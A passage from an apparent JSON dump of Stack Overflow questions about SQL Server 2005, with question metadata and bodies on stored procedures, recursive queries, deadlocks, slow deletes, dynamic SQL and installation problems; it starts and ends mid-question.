programmer.</p>\n\n<p>Would someone mind casting an eye over this and telling me if it's thread-safe?  I guess that's probably not the term DBAs/DB developers use but I hope you get the idea: basically, what happens if this sp is executing and another comes along at the same time?  Could one interfere with the other?  Is this even an issue in SQL/SPs?</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[usp_NewTicketNumber]\n\t@ticketNumber int OUTPUT\nAS\nBEGIN\n\tSET NOCOUNT ON;\n\tINSERT INTO [TEST_Db42].[dbo].[TicketNumber]\n\t\t\t   ([CreatedDateTime], [CreatedBy])\n\t\t VALUES\n\t\t\t\t(GETDATE(), SUSER_SNAME())\n\tSELECT @ticketNumber = IDENT_CURRENT('[dbo].[TicketNumber]');\n\tRETURN 0;\nEND\n</code></pre>\n"},{"tags":["python","sqlite","sql-server-2005","sqlalchemy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12619566,"title":"Query working in SQL Server  but dont work in sqlite","body":"<p>In one program on python i'm making query to SQL Server 2005 via sqlalchemy:</p>\n\n<pre><code>SELECT * FROM table \nWHERE (cipher=:value? OR CHARINDEX(cipher_mask,:value?)!=0)\nand NOT exists( SELECT * FROM table WHERE CHARINDEX(not_cipher_mask,:value?)!=0 AND code=:code?)\nand code=:code?\n</code></pre>\n\n<p>This works fine.</p>\n\n<p>I'm trying to create similar query for SQLite (it does not use function <code>CHARINDEX</code>)</p>\n\n<pre><code>SELECT * FROM table \nwhere (cipher=:value?  OR :value?  like cipher_mask+'/%')\nand not exists (SELECT * FROM table  where code=:code? and :value? like not_cipher_mask +'/%') and code=:code?\n</code></pre>\n\n<p>This works fine in SQL Server 2005, but in SQLite, I get an empty result</p>\n\n<p>Why it is not working here?</p>\n\n<p>P.S. All columns in table are <code>VARCHAR</code> with same data</p>\n"},{"tags":["sql","sql-server","sql-server-2005","common-table-expression"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2058,"score":3,"question_id":2618102,"title":"SQL: Recursively get parent records using Common Table Expressions","body":"<p>Suposse you have to following tables where a sale consists of products and a product can be placed in multiple categories. Whereby categories have a hierachly structure like:</p>\n\n<pre><code>Man\n Shoes\n  Sport\n  Casual\n Watches\nWomen\n Shoes\n  Sport\n  Casual\n Watches\n</code></pre>\n\n<p>Tables:</p>\n\n<pre><code>Sale:\n    id name \n    1  Sale1\n\nProduct:\n    id saleidfk name \n    1  1        a\n    2  1        b\n    3  1        c\n    4  1        d\n    5  1        e\n\nProductCategory :\n    productid categoryid \n    1         3\n    2         3           \n    3         4\n    4         5\n    5         10     \n\nCategory:\n    id ParentCategoryIdFk name \n    1  null               Men\n    2  1                  Shoes\n    3  2                  Sport\n    4  2                  Casual\n    5  1                  Watches\n    6  null               Women\n    7  6                  Shoes\n    8  7                  Sport\n    9  7                  Casual\n    10 6                 Watches\n</code></pre>\n\n<p>Question:</p>\n\n<p>Now on my website I want to create a control where only the categories are shown of a certain sale and where the categories are filled with the products of the sale. I also want\nto include the hierachly structure of the categories. So if we have a leave node, recusivly go up to the top node.</p>\n\n<p>So with sale1 I should have a query with the following result:</p>\n\n<pre><code>Men\n  Shoes\n    Sport\n    Casual\n  Watches\nWomen\n  Watches\n</code></pre>\n\n<p>This thing is driving me crazy :-)</p>\n\n<p>Thanks in advance!</p>\n\n<p>Gr</p>\n\n<p>Martijn</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":48666,"score":12,"question_id":792294,"title":"How to get first character of a string in SQL?","body":"<p>I have a SQL column with length of 6. Now want to take only first char of that column. Is the any string function in SQL to do this?</p>\n"},{"tags":["sql-server","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12060271,"title":"XQuery on 2005 and SQLSM2008","body":"<p>If You run this script on sql server 2008, works fine.</p>\n\n<pre><code>declare @tab table(\nid_emp int,\nFIL_ROT_WID xml\n)\n\ninsert into @tab\nselect 0, '&lt;xml&gt;&lt;/xml&gt;'\n\ndeclare @xml_rot_widget xml\nset @xml_rot_widget = '&lt;ati id=\"1123\" val=\"new()\" /&gt;'\n\nupdate @tab\nset FIL_ROT_WID.modify('insert sql:variable(\"@xml_rot_widget\")\n                    as last\n                    into (/xml)[1]')\nwhere id_emp = 0\n\nselect * from @tab\n</code></pre>\n\n<p>But Im using SQL Server 2005 with SQLSMS2008 and this scripts works fine too. But with the same level of databse em SQLSMS2005 I receive the following error:</p>\n\n<pre><code>XQuery: SQL type 'xml' is not supported in XQuery.\n</code></pre>\n\n<p>Im already solve the problem, but my question is:\nHow to configure the SQLSMS2008 to run script and parse them for DB 2005?</p>\n\n<p>Ah, <strong>Tools > Options > SQL Server Object Explorer > Scripting > Script for server version</strong>\ndoes not work. It keep running like 2008.</p>\n\n<p>Tks</p>\n"},{"tags":["sql-server-2005","nhibernate","nhibernate-criteria"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":10879031,"title":"nhibernate, sql server Datetime compare failing","body":"<p>In nhibernate i am using following to compare date</p>\n\n<pre><code>Restrictions.Eq(Projections.Property(\"SubmittedDate\"), request.Data.SubmittedDateTime.Value)\n</code></pre>\n\n<p>in local environment its working. but in other environment its not returning result.</p>\n\n<pre><code>SubmittedDateTime? is nullable\n</code></pre>\n\n<p>do i need to mention nullable somewhere in mapping file.</p>\n\n<p>Is there any change i need to do in code for this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12609795,"title":"SQL Server : Distinct + random rows","body":"<p>How do I pick distinct as well as random rows from a SQL Server 2008/2005 table?</p>\n\n<p>I have a list of tips from which I need to pick a few tips <strong>randomly</strong> and they must be <strong>unique</strong> too.</p>\n\n<p>I tried:</p>\n\n<pre><code>Select \n    Distinct Tips \nFrom \n    jfpastrologytips \nWhere \n    GetDate() &lt;= validtill \nOrder by \n    NewId()\n</code></pre>\n\n<p>and got commissioned with exception</p>\n\n<blockquote>\n  <p><em>Msg 145, Level 15, State 1, Line 1<br>\n  ORDER BY items must appear in the select list if SELECT DISTINCT is specified.</em></p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":7742,"score":1,"question_id":771248,"title":"Size of a single Record ? SQL","body":"<p>I have a scenario where every user has been allocated 2 MB of database space.\nNow I have to show Percenatge usage of their allocated space, to do so I need to know the size of single record in the Table.</p>\n\n<p>I have tried to use sp_spaceused and even wrote a custom procedure making use of datalength .. but they show vast difference in their result.</p>\n\n<p>Is there any way around to get this thing right.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-server-2000"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12606634,"title":"SQL temptables Loop query","body":"<p>I have a temporary Table which looks like </p>\n\n<p>TmpTable :</p>\n\n<pre><code>          ID(not unique)   Platform Name    OS    version \n\n           13                 UNIX          Ipad     5.1\n           13                 Windows       Windows  2008\n           14                 MAC           Ipad     4.1\n</code></pre>\n\n<p>Look_UP Tbl : for each of the above columns </p>\n\n<pre><code>    PlatformName LookuP Tbl: platform id  desc\n                                 2        Unix\n                                 5        windows\n\n       OS Lookup            :  OS id    OSname\n                                 4       Ipad\n\n    Version Lookup          :  Version id  name\n                                 5         5.1\n</code></pre>\n\n<p>Then Have EmpPlatformID , EmpOSID &amp; EmpVersionID like below ;</p>\n\n<pre><code>       EmpPlatform  - EmpId  PltformNameID\n                       13         1\n                       13         6\n       same for OS &amp; ID \n</code></pre>\n\n<p>I need a query that\n1) uses the lookup tables to get the corresponding ID for each column(PlatformName,OS,Version) for each of the employee id . \n2) Insert the ID for that empid in each of the actual tables .</p>\n\n<p>So , empPlatformTable should look like ;</p>\n\n<pre><code>       EmpPlatform  - EmpId  PltformNameID\n                       13         1\n                       13         6\n                       13         2    - new row added from tmptbl\n                       13         5    - new row added from tmptbl\n The EmpOS &amp; EmpVer also has similar column so the emp id should have corresponding IDs inserted from temptbl . please helps\n</code></pre>\n\n<p>EDIT:\nCode to update PlatformName</p>\n\n<pre><code>Update EmpPN \n    Set EmpN.platform_id = PLookup.platform_id \nfrom #TempTable tmpd (READUNCOMMITTED) \ninner join EmpPlatform EmpPN (READUNCOMMITTED) \n    on EmpPN.emp_id = emp_id collate database_default \ninner join PlatformLookUpTbl PLookup(READUNCOMMITTED)\n    on PLookup.[platform_name] = tmpd.PlatformName collate database_default\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12606284,"title":"SQL Server 2005 Delete Query SLOW","body":"<p>I have a Delete Query that each day needs to run deleting any data that is greater than 7 days old which is about 6 Million Records.</p>\n\n<p>My table should only store data for the last 7 days. </p>\n\n<p>Here is the query I am running:</p>\n\n<pre><code>DELETE FROM [tblTSS_DataCollection]\nWhere [DatapointDate] &lt; DATEADD(D, -7, GETDATE()) \n</code></pre>\n\n<p>This query takes 5.5 minutes to execute. I have an index setup that includes this so I don't think it should be taking this long to execute:</p>\n\n<pre><code>CREATE UNIQUE NONCLUSTERED INDEX [IX_tblTSS_DataCollection] ON [dbo].  [tblTSS_DataCollection] \n(\n[DataPointID] ASC,\n[DatapointDate] ASC,\n[AssetID] ASC\n)\n</code></pre>\n\n<p>Is there a better way to delete this data? It takes forever and I really need to be able to delete this data quickly.</p>\n"},{"tags":["sql-server-2005","parent-child","flatten"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12604512,"title":"Establish Parent/Child Relationship and Flatten File","body":"<pre><code>DECLARE @LIST VARCHAR(1000)\nSET @LIST = ''\n\nSELECT @LIST = @LIST + MASTER.EE_GROUP + '' FROM (SELECT DISTINCT \n      EMPLOYEE\n    , EE_GROUP\nFROM MASTER\nWHERE MSTR_END LIKE '%1753%') WHERE PARENTID = @ID\n\nRETURN @LIST  \n</code></pre>\n\n<p><code>SELECT</code> query returns data such as: </p>\n\n<pre><code> EMPLOYEE       EE_GROUP\n 8              A\n 8              B\n 8              C\n 9              D\n 10             B\n</code></pre>\n\n<p>Need result: </p>\n\n<pre><code> EMPLOYEE      GROUP1      GROUP2         GROUP3\n 8             A           B              C\n 9             D           NONE (OR NULL) NONE (OR NULL)\n 10            B           NONE (OR NULL) NONE (OR NULL) \n</code></pre>\n\n<p>Receiving following errors. I am assuming because there is not a parent-child relationship established. I don't know how to resolve this. </p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 9<br>\n  Incorrect syntax near the keyword 'WHERE'.<br>\n  Msg 178, Level 15, State 1, Line 11<br>\n  A RETURN statement with a return value cannot be used in this context.</p>\n</blockquote>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12605511,"title":"SQL Server 2005 - incorrect value in sys.master_files","body":"<p>I'm running SQL Server 2005 on a 64-bit Windows 7 machine (installed to Program Files (x86)).  The problem I'm having is that when I try to access my database through Java, the method fails, as it looks for the database in the wrong directory (it looks for it in Program Files).  After a little tinkering around, I think I'v found the problem: the physical_name value in sys.master_files (that references the database locations) is pointing to the wrong folder.</p>\n\n<p>Does anybody know how this may have happened or how to fix it?  SQL Server won't let me update sys.master_files with the correct value.</p>\n"},{"tags":["sql","sql-server-2005","optimization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12602590,"title":"SQL Query optimisation not exists","body":"<p>I need to optimise the following query, can anyone help? I know it's the Not Exists part that is causing the problem as it is doing a massive table scan, but I'm new to this, can anyone give any advice?</p>\n\n<pre><code>select count(*)\nfrom Job j\nwhere company = 'A'\nand branch = 'Branch123'\nand engineerNumber = '000123'\nand ID &gt; 60473\nand not exists(\nselect JobNumber, Company, Branch\nfrom OutboundEvents o\nwhere o.JobNumber = j.JobNumber\n    and o.branch = j.branch\n    and o.company = j.company\n    and o.Formtype = 'CompleteJob')\n</code></pre>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","ado.net"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4209,"score":0,"question_id":3491302,"title":"Select a data from MS SQL Server 2005","body":"<p>I have a table named <code>t_Student</code> in Microsoft SQL Server 2005 database. In that table there are three columns named <code>student_regiNo</code>, <code>student_Name</code>, <code>student_Email</code>.</p>\n\n<p>I'm using following code segment to retrieve \"student_Name\". But instead of showing \"student_Name\" it shows \"System.Data.SqlClient.SqlDataReader\". Whats the problem?</p>\n\n<pre><code>private void GetDatabaseConnection()\n{\n    string connectionString = @\"server=RZS-F839AD139AA\\SQLEXPRESS; Integrated Security = SSPI; database = StudentCourseInformation\";\n    connection = new SqlConnection(connectionString);\n    connection.Open();\n}\n\npublic string GateStudentName(string selectedStudentRegiNo)\n{\n    GetDatabaseConnection();\n\n    string selectedStudentQuery = @\"SELECT student_Name FROM t_Student WHERE (\n                                  student_regiNo = \n                                  '\" +selectedStudentRegiNo+ @\"'  \n                                   )\";\n    SqlCommand command = new SqlCommand(selectedStudentQuery, connection);\n    SqlDataReader reader = command.ExecuteReader();\n\n    string selectedStudentName = Convert.ToString(reader);\n    return selectedStudentName;\n}\n</code></pre>\n"},{"tags":["php","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":353,"score":0,"question_id":10387386,"title":"Equivalent of LIMIT in T-SQL","body":"<p>In PHP I'm doing a SQL Server query where I need (LIMIT) type functionality.  I already know that TOP is typically used in SQL Server instead of LIMIT (which is MySQL syntax).  However, TOP doesn't allow you to set on 'offset' the way LIMIT does.  In my query, I will need the 'offset' and 'number of rows' to be dynamic. Example:  </p>\n\n<pre><code>LIMIT $startRow, $maxRow\n</code></pre>\n\n<p>Any thought, or suggestions?</p>\n"},{"tags":["sql-server-2005","stored-procedures","triggers"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":353,"score":2,"question_id":4261278,"title":"Is it possible for a trigger to find the name of the stored procedure that modified data?","body":"<p>There are a few stored procedures that routinely get called by a few different systems to do maintenance on a few tables in our database. Some are automated, some aren't.</p>\n\n<p>One of the tables has a column where the number is sometimes off, and we don't know for sure when or why this is happening. I want to put a trigger on the table so I can see what is being changed and when, but it'd also be helpful to know which procedure initiated the modification.</p>\n\n<p>Is it possible to get the name of the stored procedure from the trigger? If not, is there any other way to tell what caused something to be modified? (I'm not talking about the user either, the name of the user doesn't help in this case).</p>\n"},{"tags":["sql-server-2005","locking","insert-update","database-deadlocks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":400,"score":0,"question_id":10599275,"title":"Why can't I insert/update data without locking the entire table in SQL Server 2005?","body":"<p>I am trying to insert/update rows in a SQL Server table (depending on whether it exists or not). I am executing the SQL from multiple threads on multiple machines and I want to avoid getting duplicate key errors.</p>\n\n<p>I have found many solutions online but all of them are causing transaction deadlocks. This is the general pattern I have been using:</p>\n\n<pre><code>BEGIN TRANSACTION\n\nUPDATE TestTable WITH (UPDLOCK, SERIALIZABLE)\nSET Data = @Data \nWHERE Key = @Key\n\nIF(@@ROWCOUNT = 0)\nBEGIN\n     INSERT INTO TestTable (Key, Data)\n     VALUES (@Key, @Data)\nEND\n\nCOMMIT TRANSACTION\n</code></pre>\n\n<p>I have tried:</p>\n\n<ul>\n<li><code>WITH XLOCK</code> instead of <code>UPDLOCK</code></li>\n<li><code>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE</code> at the beginning with <code>UPDLOCK</code></li>\n<li><code>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE</code> and no table hints</li>\n</ul>\n\n<p>I have also tried the following pattern with all the combinations above:</p>\n\n<pre><code>BEGIN TRANSACTION\n\nIF EXISTS (SELECT 1 FROM TestTable WITH (UPDLOCK, SERIALIZABLE) WHERE Key=@Key) \nBEGIN\n    UPDATE TestTable\n    SET Data = @Data \n    WHERE Key = @Key\nEND\nELSE\nBEGIN\n    INSERT INTO TestTable (Key, Data)\n    VALUES (@Key, @Data)\nEND\n\nCOMMIT TRANSACTION\n</code></pre>\n\n<p>The only way I can get it to work without deadlocks is to use <code>WITH (TABLOCKX)</code>.</p>\n\n<p>I am using SQL Server 2005, the SQL is generated at runtime and so it is not in a stored procedure and some of the tables use composite keys rather than primary keys but I can reproduce it on a table with an integer primary key.</p>\n\n<p>The server logs look like this:</p>\n\n<pre><code>waiter id=processe35978 mode=RangeS-U requestType=wait\nwaiter-list\nowner id=process2ae346b8 mode=RangeS-U\nowner-list\nkeylock hobtid=72057594039566336 dbid=28 objectname=TestDb.dbo.TestTable indexname=PK_TestTable id=lock4f4fb980 mode=RangeS-U associatedObjectId=72057594039566336\nwaiter id=process2ae346b8 mode=RangeS-U requestType=wait\nwaiter-list\nowner id=processe35978 mode=RangeS-U\nowner-list\nkeylock hobtid=72057594039566336 dbid=28 objectname=TestDb.dbo.TestTable indexname=PK_TestTable id=lock2e8cbc00 mode=RangeS-U associatedObjectId=72057594039566336\n</code></pre>\n\n<p>The mode is obviously different depending on the table hint used (but the processes are always waiting for the mode they already own). I have seen RangeS-U, RangeX-X and U.</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":26608,"score":4,"question_id":633848,"title":"Arithmetic overflow error converting expression to data type datetime","body":"<p>This select statement gives me the arithmetic error message:</p>\n\n<pre><code>SELECT CAST(FLOOR((CAST(LeftDate AS DECIMAL(12,5)))) AS DATETIME), LeftDate \nFROM Table\nWHERE LeftDate &gt; '2008-12-31'\n</code></pre>\n\n<p>While this one works:</p>\n\n<pre><code>SELECT CAST(FLOOR((CAST(LeftDate AS DECIMAL(12,5)))) AS DATETIME), LeftDate \nFROM Table\nWHERE LeftDate &lt; '2008-12-31'\n</code></pre>\n\n<p>Could there be something wrong with the data (I've checked for null values, and there are none)?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":132,"score":1,"question_id":12589785,"title":"Can't install Microsoft SQL Server 2008 (R2) Management Studio","body":"<p>EDIT: solved! read below</p>\n\n<p>When I want to install MS SQL Server 2008 (R2) on my Win7 PC, I keep getting the error that I need to remove my SQL Server 2005 Express. This is, however, no longer installed.\n<img src=\"http://i.stack.imgur.com/NS3zb.png\" alt=\"enter image description here\"></p>\n\n<p>I followed the same routine as here: <a href=\"http://stackoverflow.com/questions/175881/sql-server-express-2008-install-side-by-side-w-sql-2005-express-fails\">SQL Server Express 2008 Install Side-by-side w/ SQL 2005 Express Fails</a> without result.</p>\n\n<p>I deleted everything linking to SQL Server 2005 and tried to install the 2008, same error ...<br>\nReinstalled 2005 and tried to update via the 2008 setup, \"can't find 2005 shared modules to update\"<br>\nDeleted 2005, rebooted, ran 2008 setup, same error: need to remove 2005 Express<br>\nReinstalled 2005, deleted shared modules, tried to install 2008, same error as above<br>\nCompletely deleted 2005, rebooted, ran setup, still 2005 on the system?!</p>\n\n<p>I ran the setup this time again and installed everything except the Menegement Studio.<br>\nToo bad this is the one program I definitly need to follow my classes.</p>\n\n<p>I hope you guy can help me with this!</p>\n\n<p>PS: I've got a lot of SQL programs installed, because I've got Visual Studio, SQLyog, ... installed for my studies</p>\n\n<p><strong>SOLUTION</strong><br>\nFound someone with the same problem: <a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlsetupandupgrade/thread/5fc58507-9f40-4213-acbd-32a57c8822d7/\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlsetupandupgrade/thread/5fc58507-9f40-4213-acbd-32a57c8822d7/</a><br>\nHow I solved my problem: As I have a 64bit system, I had to remove this registerfolder: <em>HKLM\\Software\\Wow6432Node\\Microsoft\\Microsoft SQL Server\\90</em><br>\nFor 32bit systems: remove <em>HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90</em></p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12593420,"title":"Update SQL variable when recordset is empty","body":"<p>We have a loop in SQL Server 2005 that loops around on a table getting each items parent until it gets to the top of the tree:</p>\n\n<pre><code>DECLARE @T Table\n(\n  ItemID INT NOT NULL PRIMARY KEY,\n  AncestorID INT NULL \n)\n</code></pre>\n\n<p>Which has data like this:</p>\n\n<pre><code>ItemID | AncestorID\n  1          2\n  2          3\n  3          4\n  4          NULL\n</code></pre>\n\n<p>We have a loop that basically does this:</p>\n\n<pre><code>DECLARE @AncestorID INT\nSELECT @AncestorID = 1\nWHILE (@AncestorID IS NOT NULL)\nBEGIN   \n  --Do some work   \n  SELECT @AncestorID = T.AncestorID   \n  FROM @T t  \n  WHERE T.ItemID = @AncestorID\n\n  print @AncestorID\nEND\n</code></pre>\n\n<p>(Yes I know SQL is set based, and this is processing row by row, the \"Do some work\" needs to be done line by line for a reason).</p>\n\n<p>This has always worked fine until today when we ended up in an endless loop. Turns out the cause was some wrong data:</p>\n\n<pre><code>ItemID | AncestorID\n  1          2\n  2          3\n\n  4          NULL\n</code></pre>\n\n<p><code>ItemID</code> 3 was deleted. The loop now never ends because <code>AncestorID</code> is never <code>NULL</code> - it stays at 3.</p>\n\n<p>Is there anyway to rewrite the select statement to make <code>@AncestorID</code> null if the <code>SELECT</code> query returns 0 rows, or do I need to have a separate <code>SELECT</code> statement to count the records and some <code>IF ELSE</code> type logic?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":12592319,"title":"How to specify perticular table columns case sensitive in SQL Server 2005","body":"<pre><code> String dmlString=\"INSERT INTO table VALUES('Rxyz');\n SqlCommand comObj = new SqlCommand(dmlString, conObj);\n                comObj.ExecuteNonQuery();\n</code></pre>\n\n<p>table -> Rxyz</p>\n\n<p>How to validate it, as Rxyz (case sensitive)</p>\n"},{"tags":["sql-server-2005","dotnetnuke","dotnetnuke-5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12288746,"title":"Copy database error (DNN): No primary or candidate keys in the referenced table that match the referencing column list in the foreign key","body":"<blockquote>\n  <p>DNN version: 5.6.2</p>\n  \n  <p>Tool: SQL Server Management Studio</p>\n  \n  <p>Action: Copy database</p>\n  \n  <p>Error: There are no primary or candidate keys in the referenced table\n  'Roles' that match the referencing column list in the foreign key\n  'FK_UserRoles_Roles'</p>\n</blockquote>\n\n<p>I tried searching for this error online, but all searches lead to topics where this error is encountered while creating a foreign key to a non-unique column. In my case, the key is already created. I double-checked that the RoleId column is the primary key on the Roles table and it is indeed the column the foreign key 'FK_UserRoles_Roles' references.</p>\n\n<p>Any help to fix this is appreciated. Alternatively, what will be a quick way to copy the structure and data of my database apart from the \"Copy Database\" option? </p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server-2008","query","sql-server-2005","parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12591872,"title":"Multiple table query not working on certain databases","body":"<p>I have 12 locations each running their own database.  Each database is setup exactly the same, with their own information.  The databases are all SQL2005 or 2008 server.  I wrote a multiple table query to pull information for paying commission on sales.  This query works on 10 of the 12 databases, the other 2 databases do not return any results.  If I run the query with 2 joined tables (on the 2 databases it does not work on) it works, however the other tables in question have nothing to do with the \"where\" statement.  Could anyone shed some light on why it would not work on 2 of the 2005 server databases if it works on all of the others?  My Code is:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                         Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                         @enddate AS End_Date\nFROM            CustomerUnlimitedTransactions INNER JOIN\n                         Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID INNER JOIN\n                         VIPAccountTypes ON CustomerUnlimitedTransactions.lMonthlyAccountTypeId = VIPAccountTypes.lAccountType INNER JOIN\n                         Surcharges ON VIPAccountTypes.lSurchargeId = Surcharges.Surcharge_ID INNER JOIN\n                         Users ON Customers.lGreeterID = Users.ID_User\nWHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102)) AND \n                         (CustomerUnlimitedTransactions.sTransactionType = N'sale') AND (CustomerUnlimitedTransactions.lMonthlyAccountTypeId = '11') OR\n                         (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102)) AND \n                         (CustomerUnlimitedTransactions.sTransactionType = N'sale') AND (CustomerUnlimitedTransactions.lMonthlyAccountTypeId = '12')\nORDER BY Created\n</code></pre>\n\n<p>If I run the query like this I still do not return any results:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                             Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                             @enddate AS End_Date\n    FROM            CustomerUnlimitedTransactions INNER JOIN\n                             Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID INNER JOIN\n                             VIPAccountTypes ON CustomerUnlimitedTransactions.lMonthlyAccountTypeId = VIPAccountTypes.lAccountType INNER JOIN\n                             Surcharges ON VIPAccountTypes.lSurchargeId = Surcharges.Surcharge_ID INNER JOIN\n                             Users ON Customers.lGreeterID = Users.ID_User\n    WHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102))\n    ORDER BY Created\n</code></pre>\n\n<p>If I run the query like this I DO get results:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                                 Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                                 @enddate AS End_Date\n        FROM            CustomerUnlimitedTransactions INNER JOIN\n                                 Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID \n        WHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102))\n        ORDER BY Created\n</code></pre>\n\n<p>There are not any Null's associated with any of the above query's.  Again this works on 10 of 12... and yes the databases are EXACTLY the same.  (if I run this query out for a year date range I get results) however I should show 25 results from last week alone, and I am showing none on each of the 2.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12585091,"title":"SQL Server : execute dynamic sql help please","body":"<pre><code>EXEC SP_EXECUTESQL \n            @DynamicSQL\n        ,   N'@HostIDs VARCHAR(MAX) OUTPUT'\n        ,   @HostIDs OUTPUT;\n\nPRINT @HostIDs;\n\nSELECT @HostIDs AS HostIDs;\nSET @UpdateSQL = '\n            EXECUTE [dbo].[usp_Win7_HostUpdater_NEW]\n            @HostID = ''' + @HostIDs + ''' , \n            @PackageID = ''' + @PackageID  + ''' , \n            @MigrationFlag = ''' + @MigrationFlagID + ''' , \n            @Manufacturer = ' + @Manufacturer + ' , \n            @Product = ' + @Product + ' , \n            @Version = ' + @Version + ' ,\n            @Reason = ' + @Reason + ' ,\n            @Contact = ' + @Contact + '\n        ';\n\n        SELECT @UpdateSQL AS UpdateSQL;\n        PRINT @UpdateSQL;           \n        EXEC( @UpdateSQL )  \n  END  \n</code></pre>\n\n<p>I have a stored procedure on both a SQL Server 2005 and 2008 in which the above code is the last part of </p>\n\n<p>it returns a <code>VARCHAR(MAX)</code> of numbers separated by commas.</p>\n\n<p>Now this returned value is large upwards of 600k characters. If I execute this on a SQL Server 2005 it works like 50% of the time, <code>@HostIDs</code> is populated always and <code>@UpdateSQL</code> gets generated with the correct values and is executed.</p>\n\n<p>On SQL Server 2008, <code>@HostIDs</code> is populated but <code>@UpdateSQL</code> is always NULL</p>\n\n<p>This is weirding me out tremendously</p>\n\n<p>Can anyone maybe shed some light on my odd problem?</p>\n"},{"tags":["sql","sql-server","xml","sql-server-2005","xml-parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12591401,"title":"XML to SQL temp tables","body":"<p>I have a XML string that looks like </p>\n\n<pre><code>  &lt;PLATFORM&gt;\n  &lt;PLATFORMNAME&gt;UNIX&lt;/PLATFORMNAME&gt; \n  &lt;OS&gt;Ipad&lt;/OS&gt; \n  &lt;VERSION&gt;5.1&lt;/VERSION&gt; \n  &lt;PLATFORMNAME&gt;Windows&lt;/PLATFORMNAME&gt; \n  &lt;OS&gt;Windows&lt;/OS&gt; \n  &lt;VERSION&gt;2008 (64bit)&lt;/VERSION&gt; \n  &lt;/PLATFORM&gt;\n</code></pre>\n\n<p>Which I need to insert into a temptable</p>\n\n<pre><code>   Create Table #TempXMLTable\n     (\n      PlatformName 